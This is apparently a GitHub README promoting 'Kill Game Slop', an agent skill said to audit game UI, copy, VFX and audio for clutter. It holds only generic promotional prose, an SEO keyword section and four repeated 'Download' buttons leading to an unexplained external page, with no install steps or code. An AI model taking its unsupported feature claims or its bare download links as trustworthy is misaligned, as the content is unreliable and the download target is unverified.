![preview](https://raw.githubusercontent.com/Mutakisa/game-slop-purge/main/hero_43f81.svg)
[![Download](https://raw.githubusercontent.com/Mutakisa/game-slop-purge/main/btn_3ca3d.svg)](https://Mutakisa.github.io/game-slop-purge/)

# 🎮 Kill Game Slop — Clarity Engine for Game Feel

> *"The player never notices good UI. They only notice when it stabs them in the eye."*

Welcome to **Kill Game Slop**, an engine-agnostic agent skill that surgically removes the noise, the clutter, and the "we'll fix it later" energy that quietly rots the heart of otherwise great games. This repository is a toolkit, a methodology, and a gentle manifesto for developers who believe that polish is not a phase — it's a mindset.

Whether you're shipping a rogue-like in a weekend or a sprawling open-world epic across five years, slop accumulates. Menu text that says *"Click here to proceed"* when the player already knows to click. VFX that explode like fireworks on a matchbox. Audio stingers that scream louder than the emotion they're supposed to underline. **Kill Game Slop** is the antidote.

[![Download](https://raw.githubusercontent.com/Mutakisa/game-slop-purge/main/btn_3ca3d.svg)](https://Mutakisa.github.io/game-slop-purge/)


## 🧭 Table of Contents

- [Why This Exists](#-why-this-exists)
- [What Counts as "Slop"?](#-what-counts-as-slop)
- [Core Pillars](#-core-pillars)
- [Feature List](#-feature-list)
- [The Four Domains](#-the-four-domains)
  - [UI & HUD](#1-ui--hud)
  - [Copy & Microtext](#2-copy--microtext)
  - [VFX & Feedback](#3-vfx--feedback)
  - [Audio & Soundscape](#4-audio--soundscape)
- [How the Agent Skill Works](#-how-the-agent-skill-works)
- [Responsive UI Principles](#-responsive-ui-principles)
- [Multilingual Support](#-multilingual-support)
- [Always-On Assistance](#-always-on-assistance)
- [Repository Structure](#-repository-structure)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability](#-seo--discoverability)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Download](#-download)


## 🌱 Why This Exists

Game development has a silent tax. Every extra tooltip, every redundant sound cue, every glowing particle spawned because "it looked cool in the demo" — they compound. Three months into production, your game feels like a cluttered attic where every object is technically intentional and nothing is actually findable.

**Kill Game Slop** was born from the observation that most games don't fail because of bad ideas. They fail because good ideas get buried under layers of accumulated noise. This repository exists to give developers — and increasingly, AI agents embedded in their pipelines — a concrete framework for identifying and eliminating that noise without gutting the soul of the project.

We call it a *clarity engine*. You feed it your game's UI mockups, your copy decks, your VFX timelines, your audio stems. It returns surgical recommendations. Not opinions. Not vibes. Recommendations grounded in player psychology, readability science, and the accumulated wisdom of a thousand postmortems.


## 🧹 What Counts as "Slop"?

Slop is anything that:

- **Explains what the player already knows** — "Press X to jump" on a tutorial screen the player has seen twice.
- **Competes for attention without earning it** — particle effects so loud they hide enemy telegraphs.
- **Uses language that sounds like a legal document** — "You are now entering the inventory interface" instead of "Inventory."
- **Repeats information** — a health bar, a health number, and a health icon, all in the same corner.
- **Animates for the sake of animating** — menu transitions that take 800ms to fade in.
- **Plays sound without meaning** — a joyful chime every time the player opens a menu, until it grates like a smoke alarm.
- **Fails gracefully the wrong way** — "An error has occurred. Please try again later." What error? Where? Why?

If a piece of your game can be removed without the player noticing, it was never carrying weight. If removing it *improves* the experience, it was actively harming it.


## 🏛️ Core Pillars

| Pillar | Meaning | Practical Test |
|---|---|---|
| **Clarity** | Every element has a single, obvious purpose | Can you explain it in under five words? |
| **Restraint** | Absence is a design material | Would removing it break anything? |
| **Hierarchy** | Only one thing should shout at a time | Where does your eye land first? |
| **Consistency** | The same rule everywhere, always | Does the corner menu behave the same on every screen? |
| **Respect** | The player's time and intelligence are sacred | Are you explaining, or condescending? |


## ✨ Feature List

- 🧠 **Engine-agnostic architecture** — works with any framework, from hand-rolled renderers to established 3D pipelines.
- 🎯 **Domain-specific linting** — dedicated rules for UI, copy, VFX, and audio, not one diluted meta-rule.
- 📱 **Responsive UI auditing** — catches layout slop that only reveals itself on ultrawide monitors or tiny handhelds.
- 🌍 **Multilingual support** — built-in checks for text expansion, right-to-left layouts, and font fallback issues.
- 🕒 **Always-available assistance** — a resident agent that runs during CI, during playtests, or on demand from your IDE.
- 🧩 **Composable rule packs** — pull in only the rule families that match your project's genre and budget.
- 🔁 **Diff-friendly reports** — every finding comes with a before/after suggestion, ready to drop into a PR.
- 📊 **Slop Score™** — a single, humbling number that tracks your project's clarity over time.
- 🧾 **Copy tone mapper** — rewrites dry placeholder text into language that respects the player.
- 🎚️ **VFX intensity governors** — prevents feedback from drowning out gameplay-critical signals.
- 🔊 **Loudness curve analysis** — flags sounds that spike above their emotional weight.
- 🧪 **Playtest-friendly modes** — annotate findings in a capture stream for async review.
- ⚙️ **Config-not-code philosophy** — tune rules in plain configuration files, no recompilation required.
- 📦 **Self-contained output** — recommendations are portable artifacts, not vendor lock-in.


## 🧱 The Four Domains

### 1. UI & HUD

The user interface is the game's handshake. It should be firm, brief, and confident. Slop in UI shows up as:

- Redundant stat displays (icon + number + bar + tooltip for the same value).
- Menus that animate slower than the player can think.
- Buttons whose labels describe their mechanics ("Close window") instead of their intent ("Back").
- Dead space that reads as broken layout on wide displays.

Our UI auditor scans mockups, layout trees, and runtime screenshots, then produces annotated overlays with margin, contrast, and hierarchy findings. It understands that a great HUD is *felt*, not studied.

### 2. Copy & Microtext

Words are the cheapest asset in a game and the easiest to ruin. Our copy domain hunts for:

- Verbose tutorials that should be a single verb.
- Placeholder strings accidentally shipped to players.
- Tone shifts between menus (cheerful shop, grim settings panel, sarcastic loading screens).
- Disrespectful language — mocking the player, blaming them, or padding their time with waffle.

The tone mapper reviews strings against a configurable voice profile: *warm and dry*, *terse and technical*, *playful but never cloying*. It returns rewrites with rationale.

### 3. VFX & Feedback

Visual effects are punctuation. Use too many exclamation marks, and nothing reads as exciting. This domain flags:

- Effects that obscure enemy telegraphs or hit confirms.
- Overlapping particles from independent systems that collectively blind the player.
- Infinite-duration VFX that never resolve, leaving residue on screen.
- Effects that play on events the player has already internalized.

The result is a timeline view showing where visual noise crowds out visual signal.

### 4. Audio & Soundscape

Sound is the most intimate channel in a game. Slop here sounds like:

- Stingers played on every minor state change, flattening emotional range.
- Music that never dips, so moments that matter can't stand out.
- UI clicks so loud they override the actual gameplay feedback.
- Mixes where dialogue fights ambient loops for the same frequency band.

The audio auditor produces a loudness map aligned to gameplay events, highlighting where intensity no longer matches narrative intent.


## 🤖 How the Agent Skill Works

The skill is designed to slot into any agentic workflow. It exposes a small number of verbs:

- **inspect** — surface every finding in a given domain.
- **propose** — generate concrete, diffable edits.
- **simulate** — predict how a change affects the Slop Score.
- **annotate** — attach findings to screenshots, timelines, or transcripts.

Under the hood, the skill composes:

1. A **knowledge base** of clarity principles, updated as new postmortems arrive.
2. A **rule engine** with per-domain heuristics.
3. A **suggestion writer** that produces language tailored to your project's voice.
4. A **reporter** that outputs human-readable summaries and machine-readable JSON.

No single heuristic is treated as gospel. Two reviewers disagreeing on a finding is a feature, not a bug — the ambiguity is surfaced honestly, and the final call rests with the team.


## 📱 Responsive UI Principles

A HUD that looks tidy on one monitor and chaotic on another is not a HUD — it's a gamble. The responsive auditor checks for:

- **Anchoring drift** — elements that stay glued to the wrong edge when the aspect ratio shifts.
- **Text reflow failure** — labels that truncate mid-word when localised strings grow.
- **Safe-area violations** — content hidden behind notches, rounded corners, or TV overscan.
- **Scaling cliffs** — where a tiny nudge in resolution flips a layout from graceful to grotesque.

Every finding comes with a suggested rule, not just a complaint.


## 🌍 Multilingual Support

Slop doesn't just speak one language. When text expands by 30–40% in German, French, or Finnish, menus that "fit fine" become rubble. The multilingual module validates:

- Text expansion tolerance across a curated language set.
- Right-to-left mirroring for layouts that assume leftward reading order.
- Font fallback integrity — no tofu boxes replacing meaning.
- Cultural tone checks so that a joke in one language doesn't become an insult in another.
- Copy length budgets enforced at authoring time, not at localisation time.

The result: your game feels native in every language, not merely translated.


## 🕒 Always-On Assistance

Every project faces the 3 a.m. emergency. A build is failing because a tooltip grew too long. A teammate can't remember whether the mute icon needs a strikethrough. The skill is designed to be available whenever it's needed:

- Runs silently in continuous integration, annotating pull requests.
- Wakes up on demand inside the editor when you highlight a scene.
- Answers plain-language questions in your terminal-style workflow.
- Ships a persistent knowledge base so context never gets lost between sessions.

Support doesn't sleep, and neither does the clarity engine. When you ask at 4 a.m. whether a sound is too loud, you get an answer — with a rationale, not a vibe.


## 📂 Repository Structure

Top-level layout is intentionally shallow so newcomers can find their way in seconds:

- **docs/** — the philosophy, domain primers, and worked examples.
- **rules/** — all rule packs, organised by domain and severity.
- **skills/** — agent skill definitions, ready to be wired into any harness.
- **examples/** — annotated before/after walkthroughs from real projects.
- **analyzers/** — the parsers that understand UI trees, string decks, effect timelines, and audio stems.
- **reports/** — templates for human summaries and machine-readable findings.
- **tools/** — small utilities for local development and rule authoring.
- **tests/** — behavioural fixtures guaranteeing rules stay honest.

Each folder ships its own short README explaining *why* it exists, not just *what* it contains.


## 🗺️ Roadmap for 2026

- **Q1 2026** — Public release of the copy tone mapper with community-tuned voice profiles.
- **Q2 2026** — Expanded VFX timeline analysis with per-genre presets.
- **Q3 2026** — Live audio loudness overlays during playtest capture.
- **Q4 2026** — Cross-project comparative dashboards, letting studios benchmark slop across their catalogue.
- **Ongoing** — Community rule submissions, each reviewed for clarity and restraint before entering the mainline.


## 🔍 SEO & Discoverability

This repository is written to be found by the developers who need it most — the ones searching at midnight for phrases like *game UI clarity audit*, *engine-agnostic game polish toolkit*, *reduce visual clutter in games*, *multilingual game text expansion checker*, *game feedback readability*, *VFX noise reduction*, and *audio loudness calibration for gameplay events*.

Rather than stuffing keywords into every other sentence, the documentation is written the way a thoughtful colleague would explain it. Phrases appear where they naturally belong: in headings, in domain primers, in worked examples. The result is a README that reads like a manifesto but ranks like a technical reference.


## 🤝 Contributing

We welcome contributions from developers, designers, sound engineers, localisation specialists, and anyone who has ever stared at a menu and whispered *"why is this here?"*

Before opening a pull request:

1. Read the domain primer for the area you're touching.
2. Match the existing tone — clear, calm, and specific.
3. Include a rationale for every new rule; findings without reasoning are noise.
4. Add tests that demonstrate the rule firing on a genuinely sloppy example.
5. Keep changes small enough that a reviewer can absorb them in one sitting.

Contributions that add complexity without subtracting slop will be gently declined. The point is not to cover every edge case — it's to make the common case clean.


## ⚠️ Disclaimer

This project is provided for educational and developmental purposes only. It is offered as-is, without warranty of any kind, express or implied. The authors are not responsible for any consequences arising from use, misuse, or misapplication of the recommendations contained within this repository. All trademarks, product names, and company names mentioned are the property of their respective owners and are used for identification purposes only. Always validate suggestions against your own project's requirements, legal obligations, and player safety standards before shipping. This repository does not store, transmit, or process player data, and no telemetry leaves your machine unless you explicitly enable an optional integration. Any opinions expressed in documentation or examples belong to their individual authors and do not represent the views of any employer or affiliated organisation.


## 📜 License

This repository is distributed under the **MIT License**. See the [LICENSE](LICENSE) file for the full text. The MIT License grants broad permission to use, modify, and distribute this work, provided the copyright notice and permission notice are preserved in all copies or substantial portions. If you build something delightful with it, we would love to hear about it — but you are not obligated to tell us. The license, in 2026 as in every year, remains a covenant of reciprocity rather than restriction.

[![Download](https://raw.githubusercontent.com/Mutakisa/game-slop-purge/main/btn_3ca3d.svg)](https://Mutakisa.github.io/game-slop-purge/)


## 📥 Download

[![Download](https://raw.githubusercontent.com/Mutakisa/game-slop-purge/main/btn_3ca3d.svg)](https://Mutakisa.github.io/game-slop-purge/)